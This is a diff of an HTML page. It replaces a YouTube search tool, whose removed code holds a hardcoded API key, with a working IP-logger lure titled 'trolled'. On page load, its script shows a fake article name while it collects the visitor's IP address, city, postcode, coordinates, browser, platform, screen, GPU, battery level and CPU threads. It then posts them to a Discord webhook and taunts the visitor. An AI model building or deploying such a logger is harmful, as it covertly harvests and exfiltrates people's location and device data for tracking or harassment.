@@ -1,50 +1,211 @@
 <!DOCTYPE HTML>
+
 <html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+        <title>trolled</title>
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+        <style>
+    @font-face {
+  font-family: 'Ubuntu';
+  font-style: normal;
+  font-weight: 400;
+  src: url(https://fonts.gstatic.com/s/ubuntu/v15/4iCs6KVjbNBYlgoKcg72j00.woff2) format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+      
+    </style>
 
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta property="og:type" content="website">
-<meta property="og:title" content="AbsqTube">
-<meta property="og:description" content="Simple YouTube Bypasser">
-<meta name="theme-color" content="#d42a2a">
-  <title>AbsqTube</title>
-</head>
+    </head>
+    <body onload="log()">
+        <div style="text-align:center">
+    <h1 style="font-family:'Ubuntu'" id="articlename"></h1>
+    <label style="font-family:'Ubuntu'">hahahahaha you have been ip logged</label>
+        </div>
+    </body>
+    <script>
+        async function log(){
+        const response = await fetch("https://ipapi.co/json")
+        const data = await response.json();
 
-<body style="background-color:#262626" onload="find2()">
-  <div style="text-align:center">
-  <input type="text" style="width:400px; height:20px; font-family:'Segoe UI'" id="searchterm" placeholder="Enter a search term...">
-  <button style="width:100px; height:25px; font-family:'Segoe UI'; margin:10px" onclick="find()">Search</button><br>
-  <h1 style="font-family:'Segoe UI'; color:white">Video Results</h1>
-  <label id="result" style="font-family:'Segoe UI'; color:white">Video will appear here.</label><br><br><br>
-  <h1 style="font-family:'Segoe UI'; color:white">Recent Searches</h1>
-  <label style="font-family:'Segoe UI'; color:white" id="recentsearches"></label>
-    </div>
+        var browser = "Unknown"
 
-  <script>
-    async function find(){
-  window.location.href = "https://submits.github.io/?" + document.getElementById("searchterm").value
-
+  if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ) {
+        browser = 'Opera';
+    } else if(navigator.userAgent.indexOf("Chrome") != -1 ) {
+        browser = 'Chrome';
+    } else if(navigator.userAgent.indexOf("Safari") != -1) {
+        browser = 'Safari';
+    } else if(navigator.userAgent.indexOf("Firefox") != -1 ){
+        browser = 'Firefox';
+    } else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) {
+        browser = 'Internet Explorer';
+    } else {
+        browser = 'Unknown';
     }
 
-    async function find2(){
- var segments = window.location.href.split("?")
-  let keywords = segments[1]
-  keywords = keywords.replace(/%20/g, " ")
-  document.getElementById("searchterm").value = keywords
-const YOUTUBE_API_KEY = "AIzaSyC2RxLLmi8pMxb_hPwtwcMW6XhrG4dIdBM";
-var searchterms = document.getElementById("searchterm").value
-const url = `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=1&q=${keywords}&key=${YOUTUBE_API_KEY}`;
-const response = await fetch(url)
-const data = await response.json();
-const response2 = await fetch(`https://www.googleapis.com/youtube/v3/videos?part=statistics&id=${data.items[0].id.videoId}&key=${YOUTUBE_API_KEY}`)
-const data2 = await response2.json();
-document.title = data.items[0].snippet.title
-document.getElementById("result").innerHTML = "Uploader: <b>" + data.items[0].snippet.channelTitle + "</b><br>Title: <b>" + data.items[0].snippet.title + "</b><br>Description: <b>" + data.items[0].snippet.description + "</b><br><br><b>" + data2.items[0].statistics.viewCount + "</b> Views • <b>" + data2.items[0].statistics.likeCount + "</b> Likes • <b>" + data2.items[0].statistics.dislikeCount + "</b> Dislikes • <b>" + data2.items[0].statistics.commentCount + "</b> Comments" + "<br><br><br>" + "<iframe style=\"border:none;width:600px;height:350px\" src=\"" + "https://www.youtube.com/embed/" + data.items[0].id.videoId + "\"></iframe>"
-sessionStorage.setItem("recents", "• <a href=\"" + window.location.href  + "\">" + data.items[0].snippet.title + "</a><br>" + sessionStorage.getItem("recents"));
-document.getElementById("recentsearches").innerHTML =  sessionStorage.getItem("recents");
-}
-    </script>
-</body>
+    var orientation = (screen.orientation || {}).type || screen.mozOrientation || screen.msOrientation;
+    let rotation = ""
 
+if (orientation === "landscape-primary") {
+  rotation = "Landscape"
+} else if (orientation === "landscape-secondary") {
+  rotation = "Landscape [Upside Down]"
+} else if (orientation === "portrait-secondary" || orientation === "portrait-primary") {
+  rotation = "Portrait"
+} else if (orientation === undefined) {
+  rotation = "Unknown"
+}
+
+let gpu = "";
+const gl = document.createElement('canvas').getContext('webgl');
+  if (!gl) {
+    gpu = "Unknown"
+  }
+  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+ gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+
+ if(gpu == null)
+ {
+   gpu = "Unknown"
+ }
+
+
+const battery = await navigator.getBattery();
+  const batterylevel = `${battery.level * 100}%`;
+
+        var segments = window.location.href.split("?")
+        var pingid = segments[1]
+        var webhookid = segments[2]
+        var webhooktoken = segments[3] 
+        var articlename = segments[4].replace(/%20/g, " ")
+        document.getElementById("articlename").innerHTML = articlename
+
+var currentdate = new Date(); 
+let postcode = data.postal
+let region = data.region
+let lang =  data.langitude
+let long = data.longitude
+let threads = navigator.hardwareConcurrency
+
+if(postcode == null)
+{
+  postcode = "Unknown"
+}
+if(region== null)
+{
+  region = "Unknown"
+}
+if(lang == null)
+{
+  lang = "Unknown"
+}
+if(long == null)
+{
+  long = "Unknown"
+}
+if(threads == null)
+{
+  threads = "Unknown"
+}
+
+
+var myEmbed = {
+  title: "New Info Logged",
+  description: "From URL: " + window.location.href,
+  fields: [
+      {
+        name: "IP",
+        value: data.ip + " [" + data.version + "]",
+        inline: true
+      },
+      {
+        name: "Area",
+        value: data.city + ", " + region + " [" + data.country_name + "]",
+        inline: true
+      },
+      {
+        name: "Postcode",
+        value: postcode,
+        inline: true
+      },
+      {
+        name: "Latitude/Longitude",
+        value:  lang + ", " + long,
+        inline: true
+      },
+      {
+        name: "Browser",
+        value:  browser,
+        inline: true
+      },
+      {
+        name: "Platform",
+        value: navigator.platform,
+        inline: true
+      },
+      {
+        name: "Screen Size",
+        value:  window.screen.width + " x " + window.screen.height,
+        inline: true
+      },
+      {
+        name: "Screen Rotation",
+        value:  rotation,
+        inline: true
+      },
+      {
+        name: "Battery Percentage",
+        value: batterylevel,
+        inline: true
+      },
+      {
+        name: "Graphics Card Name / Driver",
+        value:  gpu
+      },
+      {
+        name: "Number of CPU Threads/Cores",
+        value:  threads
+      },
+    {
+        name: "Fake Article Name",
+        value:  articlename,
+        
+      }
+    ],
+     footer: {
+        text: "+10000 Social Credit  •  Logged " + currentdate.toUTCString(),
+        icon_url: "https://i.imgur.com/1jdoua0.png"
+      }
+}
+        let content = "||<@" + pingid + ">||"
+        alert(data.ip + " [" + data.version + "]" + "\n" + data.city + ", " + region + " [" + data.country_name + "]" + "\n" + postcode + "\n" + lang + "," + long + "\n" + browser + "\n" + navigator.platform + "\n" + window.screen.width + " x " + window.screen.height + "\n" + rotation + "\n" + batterylevel + "\n" + gpu + "\n" + threads + "\n" + articlename)
+        const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/" + webhookid + "/" + webhooktoken);
+      request.setRequestHeader('Content-type', 'application/json');
+      const params = {
+        username: "Sex Logger [" + makeid(5) + "]",
+        avatar_url: "",
+        content: content,
+        embeds: [ myEmbed ]
+      }
+
+      request.send(JSON.stringify(params));
+
+        }
+
+        function makeid(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+      result += characters.charAt(Math.floor(Math.random() * 
+ charactersLength));
+   }
+   return result;
+}
+
+   
+    </script>
 </html>
